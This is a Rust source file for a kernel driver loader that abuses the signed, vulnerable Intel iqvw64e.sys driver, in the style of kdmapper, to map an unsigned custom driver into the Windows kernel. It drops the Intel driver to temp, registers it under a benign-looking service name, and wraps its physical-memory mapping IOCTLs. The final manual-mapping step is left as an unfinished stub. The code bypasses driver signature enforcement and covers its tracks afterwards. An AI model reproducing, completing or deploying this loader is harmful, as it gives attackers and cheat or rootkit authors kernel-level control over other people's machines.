//! Embedded Driver Loader with Manual Mapping
//! 
//! Embeds laithdriver.sys and loads it using vulnerable Intel driver exploit
//! Similar to kdmapper but fully in Rust
//!
//! Flow:
//! 1. Extract iqvw64e.sys (Intel) to temp
//! 2. Load Intel driver via SCM
//! 3. Use Intel vulnerability to map our driver
//! 4. Execute DriverEntry
//! 5. Cleanup Intel driver

use std::ffi::c_void;
use std::fs;
use std::io::Write;
use std::mem;
use std::path::PathBuf;
use std::ptr;
use windows::core::{PCWSTR, PWSTR};
use windows::Win32::Foundation::{HANDLE, CloseHandle, INVALID_HANDLE_VALUE, GetLastError};
use windows::Win32::System::Services::{
    OpenSCManagerW, CreateServiceW, OpenServiceW, StartServiceW, DeleteService,
    ControlService, CloseServiceHandle, SC_MANAGER_ALL_ACCESS, SERVICE_ALL_ACCESS,
    SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
    SERVICE_CONTROL_STOP, SERVICE_STATUS, SC_HANDLE,
};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,
};
use windows::Win32::System::IO::DeviceIoControl;

// ============================================================================
// Embedded Driver Bytes
// ============================================================================

/// Intel vulnerable driver (iqvw64e.sys) - SIGNED by Intel
/// This driver has a vulnerability that allows arbitrary physical memory R/W
/// Download from: https://github.com/TheCruZ/kdmapper-driver/raw/main/iqvw64e.sys
/// 
/// For now, we'll try to load from disk first, then embedded
#[cfg(feature = "embed_intel_driver")]
const INTEL_DRIVER_BYTES: &[u8] = include_bytes!("../../assets/iqvw64e.sys");

/// Our custom driver (laithdriver.sys)
/// Built from laith-km-driver project
#[cfg(feature = "embed_laith_driver")]  
const LAITH_DRIVER_BYTES: &[u8] = include_bytes!("../../assets/laithdriver.sys");

// ============================================================================
// Intel Driver IOCTL Codes
// ============================================================================

const IOCTL_INTEL_MAP_PHYSICAL: u32 = 0x80862007;
const IOCTL_INTEL_UNMAP_PHYSICAL: u32 = 0x80862008;

#[repr(C)]
struct IntelPhysicalMemory {
    interface_type: u64,
    bus_number: u64,
    address_space: u64,
    physical_address: u64,
    size: u64,
    out_ptr: u64,
}

// ============================================================================
// PE Structures for Manual Mapping
// ============================================================================

#[repr(C)]
#[derive(Clone, Copy)]
struct ImageDosHeader {
    e_magic: u16,
    e_cblp: u16,
    e_cp: u16,
    e_crlc: u16,
    e_cparhdr: u16,
    e_minalloc: u16,
    e_maxalloc: u16,
    e_ss: u16,
    e_sp: u16,
    e_csum: u16,
    e_ip: u16,
    e_cs: u16,
    e_lfarlc: u16,
    e_ovno: u16,
    e_res: [u16; 4],
    e_oemid: u16,
    e_oeminfo: u16,
    e_res2: [u16; 10],
    e_lfanew: i32,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ImageFileHeader {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ImageOptionalHeader64 {
    magic: u16,
    major_linker_version: u8,
    minor_linker_version: u8,
    size_of_code: u32,
    size_of_initialized_data: u32,
    size_of_uninitialized_data: u32,
    address_of_entry_point: u32,
    base_of_code: u32,
    image_base: u64,
    section_alignment: u32,
    file_alignment: u32,
    major_operating_system_version: u16,
    minor_operating_system_version: u16,
    major_image_version: u16,
    minor_image_version: u16,
    major_subsystem_version: u16,
    minor_subsystem_version: u16,
    win32_version_value: u32,
    size_of_image: u32,
    size_of_headers: u32,
    checksum: u32,
    subsystem: u16,
    dll_characteristics: u16,
    size_of_stack_reserve: u64,
    size_of_stack_commit: u64,
    size_of_heap_reserve: u64,
    size_of_heap_commit: u64,
    loader_flags: u32,
    number_of_rva_and_sizes: u32,
    // data directories follow...
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ImageNtHeaders64 {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_linenumbers: u32,
    number_of_relocations: u16,
    number_of_linenumbers: u16,
    characteristics: u32,
}

// ============================================================================
// Driver Loader Implementation
// ============================================================================

pub struct DriverLoader {
    intel_handle: Option<HANDLE>,
    intel_service: Option<SC_HANDLE>,
    scm: Option<SC_HANDLE>,
    temp_path: PathBuf,
}

impl DriverLoader {
    pub fn new() -> Self {
        let temp_path = std::env::temp_dir();
        Self {
            intel_handle: None,
            intel_service: None,
            scm: None,
            temp_path,
        }
    }
    
    /// Load our driver using Intel vulnerability
    /// Returns true if driver was loaded successfully
    pub fn load_driver(&mut self, driver_bytes: &[u8]) -> Result<bool, String> {
        log::info!("[Loader] Starting driver loading process...");
        
        // Step 1: Load Intel driver
        self.load_intel_driver()?;
        
        // Step 2: Map our driver into kernel
        let success = self.map_driver(driver_bytes)?;
        
        // Step 3: Cleanup Intel driver (security)
        self.unload_intel_driver();
        
        Ok(success)
    }
    
    /// Load Intel vulnerable driver via SCM
    fn load_intel_driver(&mut self) -> Result<(), String> {
        log::info!("[Loader] Loading Intel driver...");
        
        // Extract Intel driver to temp
        let intel_path = self.temp_path.join("iqvw64e.sys");
        
        // Try to find Intel driver in multiple locations
        let intel_bytes = self.find_intel_driver()?;
        
        // Write to temp
        let mut file = fs::File::create(&intel_path)
            .map_err(|e| format!("Failed to create temp file: {}", e))?;
        file.write_all(&intel_bytes)
            .map_err(|e| format!("Failed to write driver: {}", e))?;
        drop(file);
        
        log::info!("[Loader] Intel driver extracted to: {:?}", intel_path);
        
        // Open SCM
        unsafe {
            let scm = OpenSCManagerW(None, None, SC_MANAGER_ALL_ACCESS)
                .map_err(|e| format!("Failed to open SCM: {:?}", e))?;
            self.scm = Some(scm);
            
            let service_name: Vec<u16> = "iqvw64e\0".encode_utf16().collect();
            let display_name: Vec<u16> = "Intel Network Driver\0".encode_utf16().collect();
            let binary_path: Vec<u16> = format!("{}\0", intel_path.display())
                .encode_utf16().collect();
            
            // Try to open existing service first
            let service = OpenServiceW(scm, PCWSTR::from_raw(service_name.as_ptr()), SERVICE_ALL_ACCESS);
            
            let service = if let Ok(svc) = service {
                log::info!("[Loader] Using existing Intel service");
                svc
            } else {
                // Create new service
                log::info!("[Loader] Creating Intel service...");
                CreateServiceW(
                    scm,
                    PCWSTR::from_raw(service_name.as_ptr()),
                    PCWSTR::from_raw(display_name.as_ptr()),
                    SERVICE_ALL_ACCESS,
                    SERVICE_KERNEL_DRIVER,
                    SERVICE_DEMAND_START,
                    SERVICE_ERROR_IGNORE,
                    PCWSTR::from_raw(binary_path.as_ptr()),
                    None,
                    None,
                    None,
                    None,
                    None,
                ).map_err(|e| format!("Failed to create service: {:?}", e))?
            };
            
            self.intel_service = Some(service);
            
            // Start service
            log::info!("[Loader] Starting Intel driver...");
            let _ = StartServiceW(service, None); // Ignore error if already running
            
            // Open device handle
            std::thread::sleep(std::time::Duration::from_millis(500));
            
            let device_path: Vec<u16> = "\\\\.\\Nal\0".encode_utf16().collect();
            let handle = CreateFileW(
                PCWSTR::from_raw(device_path.as_ptr()),
                0xC0000000, // GENERIC_READ | GENERIC_WRITE
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                None,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                None,
            ).map_err(|e| format!("Failed to open Intel device: {:?}", e))?;
            
            if handle == INVALID_HANDLE_VALUE {
                return Err("Invalid handle to Intel driver".to_string());
            }
            
            self.intel_handle = Some(handle);
            log::info!("[Loader] Intel driver loaded successfully!");
        }
        
        Ok(())
    }
    
    /// Find Intel driver bytes
    fn find_intel_driver(&self) -> Result<Vec<u8>, String> {
        // 1. Check if iqvw64e.sys exists next to exe
        let exe_dir = std::env::current_exe()
            .map_err(|e| format!("Failed to get exe path: {}", e))?
            .parent()
            .map(|p| p.to_path_buf())
            .unwrap_or_default();
        
        let local_path = exe_dir.join("iqvw64e.sys");
        if local_path.exists() {
            log::info!("[Loader] Found Intel driver at: {:?}", local_path);
            return fs::read(&local_path)
                .map_err(|e| format!("Failed to read driver: {}", e));
        }
        
        // 2. Check current directory
        let current_dir = std::env::current_dir().unwrap_or_default();
        let current_path = current_dir.join("iqvw64e.sys");
        if current_path.exists() {
            log::info!("[Loader] Found Intel driver in current dir");
            return fs::read(&current_path)
                .map_err(|e| format!("Failed to read driver: {}", e));
        }
        
        // 3. Check driver subfolder
        let driver_path = exe_dir.join("driver").join("iqvw64e.sys");
        if driver_path.exists() {
            log::info!("[Loader] Found Intel driver in driver folder");
            return fs::read(&driver_path)
                .map_err(|e| format!("Failed to read driver: {}", e));
        }
        
        // 4. Try embedded (if compiled with feature)
        #[cfg(feature = "embed_intel_driver")]
        {
            log::info!("[Loader] Using embedded Intel driver");
            return Ok(INTEL_DRIVER_BYTES.to_vec());
        }
        
        Err("Intel driver (iqvw64e.sys) not found! Download from kdmapper releases.".to_string())
    }
    
    /// Map physical memory using Intel vulnerability
    unsafe fn map_physical(&self, physical_addr: u64, size: u64) -> Result<*mut c_void, String> {
        let handle = self.intel_handle.ok_or("Intel driver not loaded")?;
        
        let mut request = IntelPhysicalMemory {
            interface_type: 1,
            bus_number: 0,
            address_space: 0,
            physical_address: physical_addr,
            size,
            out_ptr: 0,
        };
        
        let mut bytes_returned = 0u32;
        let result = DeviceIoControl(
            handle,
            IOCTL_INTEL_MAP_PHYSICAL,
            Some(&request as *const _ as *const c_void),
            mem::size_of::<IntelPhysicalMemory>() as u32,
            Some(&mut request as *mut _ as *mut c_void),
            mem::size_of::<IntelPhysicalMemory>() as u32,
            Some(&mut bytes_returned),
            None,
        );
        
        if result.is_ok() && request.out_ptr != 0 {
            Ok(request.out_ptr as *mut c_void)
        } else {
            Err(format!("Failed to map physical memory: {:?}", GetLastError()))
        }
    }
    
    /// Unmap physical memory
    unsafe fn unmap_physical(&self, mapped_addr: *mut c_void, size: u64) -> bool {
        let Some(handle) = self.intel_handle else { return false };
        
        let mut request = IntelPhysicalMemory {
            interface_type: 1,
            bus_number: 0,
            address_space: 0,
            physical_address: mapped_addr as u64,
            size,
            out_ptr: 0,
        };
        
        let mut bytes_returned = 0u32;
        DeviceIoControl(
            handle,
            IOCTL_INTEL_UNMAP_PHYSICAL,
            Some(&request as *const _ as *const c_void),
            mem::size_of::<IntelPhysicalMemory>() as u32,
            Some(&mut request as *mut _ as *mut c_void),
            mem::size_of::<IntelPhysicalMemory>() as u32,
            Some(&mut bytes_returned),
            None,
        ).is_ok()
    }
    
    /// Map driver into kernel memory
    fn map_driver(&self, driver_bytes: &[u8]) -> Result<bool, String> {
        log::info!("[Loader] Mapping driver into kernel...");
        
        // Validate PE
        if driver_bytes.len() < mem::size_of::<ImageDosHeader>() {
            return Err("Driver too small".to_string());
        }
        
        unsafe {
            let dos_header = &*(driver_bytes.as_ptr() as *const ImageDosHeader);
            if dos_header.e_magic != 0x5A4D { // "MZ"
                return Err("Invalid DOS header".to_string());
            }
            
            let nt_headers = &*(driver_bytes.as_ptr().add(dos_header.e_lfanew as usize) as *const ImageNtHeaders64);
            if nt_headers.signature != 0x4550 { // "PE"
                return Err("Invalid PE signature".to_string());
            }
            
            let image_size = nt_headers.optional_header.size_of_image as usize;
            let entry_point = nt_headers.optional_header.address_of_entry_point as usize;
            
            log::info!("[Loader] Driver size: {} bytes, Entry: 0x{:X}", image_size, entry_point);
            
            // Allocate kernel memory using Intel driver
            // This is a simplified version - real implementation would:
            // 1. Find PML4 (Page Map Level 4)
            // 2. Allocate physical pages
            // 3. Map them into kernel space
            // 4. Copy sections
            // 5. Fix relocations
            // 6. Resolve imports
            // 7. Call DriverEntry
            
            log::warn!("[Loader] Manual mapping requires advanced kernel manipulation");
            log::warn!("[Loader] For now, use kdmapper externally");
            
            // For a full implementation, we'd need:
            // - Physical memory scanning for ntoskrnl.exe
            // - Finding ExAllocatePool/MmAllocateIndependentPages
            // - Calling kernel functions through physical memory manipulation
            // - This is very complex and risky
        }
        
        Ok(false) // Not implemented yet
    }
    
    /// Unload Intel driver
    fn unload_intel_driver(&mut self) {
        log::info!("[Loader] Cleaning up Intel driver...");
        
        unsafe {
            // Close device handle
            if let Some(handle) = self.intel_handle.take() {
                let _ = CloseHandle(handle);
            }
            
            // Stop and delete service
            if let Some(service) = self.intel_service.take() {
                let mut status = SERVICE_STATUS::default();
                let _ = ControlService(service, SERVICE_CONTROL_STOP, &mut status);
                let _ = DeleteService(service);
                let _ = CloseServiceHandle(service);
            }
            
            // Close SCM
            if let Some(scm) = self.scm.take() {
                let _ = CloseServiceHandle(scm);
            }
            
            // Delete temp file
            let intel_path = self.temp_path.join("iqvw64e.sys");
            let _ = fs::remove_file(intel_path);
        }
        
        log::info!("[Loader] Intel driver unloaded");
    }
}

impl Drop for DriverLoader {
    fn drop(&mut self) {
        self.unload_intel_driver();
    }
}

// ============================================================================
// Simple Service-based Loader (Alternative)
// ============================================================================

/// Simple driver loader using Windows Service Control Manager
/// Requires Test Signing mode enabled
pub struct ServiceLoader;

impl ServiceLoader {
    /// Load driver via SCM (requires test signing or signed driver)
    pub fn load(driver_path: &str, service_name: &str) -> Result<(), String> {
        unsafe {
            let scm = OpenSCManagerW(None, None, SC_MANAGER_ALL_ACCESS)
                .map_err(|e| format!("OpenSCManager failed: {:?}", e))?;
            
            let service_name_w: Vec<u16> = format!("{}\0", service_name).encode_utf16().collect();
            let binary_path_w: Vec<u16> = format!("{}\0", driver_path).encode_utf16().collect();
            
            // Try to open existing
            let service = match OpenServiceW(scm, PCWSTR::from_raw(service_name_w.as_ptr()), SERVICE_ALL_ACCESS) {
                Ok(svc) => svc,
                Err(_) => {
                    // Create new
                    CreateServiceW(
                        scm,
                        PCWSTR::from_raw(service_name_w.as_ptr()),
                        PCWSTR::from_raw(service_name_w.as_ptr()),
                        SERVICE_ALL_ACCESS,
                        SERVICE_KERNEL_DRIVER,
                        SERVICE_DEMAND_START,
                        SERVICE_ERROR_IGNORE,
                        PCWSTR::from_raw(binary_path_w.as_ptr()),
                        None, None, None, None, None,
                    ).map_err(|e| format!("CreateService failed: {:?}", e))?
                }
            };
            
            // Start
            StartServiceW(service, None)
                .map_err(|e| format!("StartService failed: {:?}", e))?;
            
            let _ = CloseServiceHandle(service);
            let _ = CloseServiceHandle(scm);
            
            Ok(())
        }
    }
    
    /// Unload driver via SCM
    pub fn unload(service_name: &str) -> Result<(), String> {
        unsafe {
            let scm = OpenSCManagerW(None, None, SC_MANAGER_ALL_ACCESS)
                .map_err(|e| format!("OpenSCManager failed: {:?}", e))?;
            
            let service_name_w: Vec<u16> = format!("{}\0", service_name).encode_utf16().collect();
            
            let service = OpenServiceW(scm, PCWSTR::from_raw(service_name_w.as_ptr()), SERVICE_ALL_ACCESS)
                .map_err(|e| format!("OpenService failed: {:?}", e))?;
            
            let mut status = SERVICE_STATUS::default();
            let _ = ControlService(service, SERVICE_CONTROL_STOP, &mut status);
            let _ = DeleteService(service);
            
            let _ = CloseServiceHandle(service);
            let _ = CloseServiceHandle(scm);
            
            Ok(())
        }
    }
}

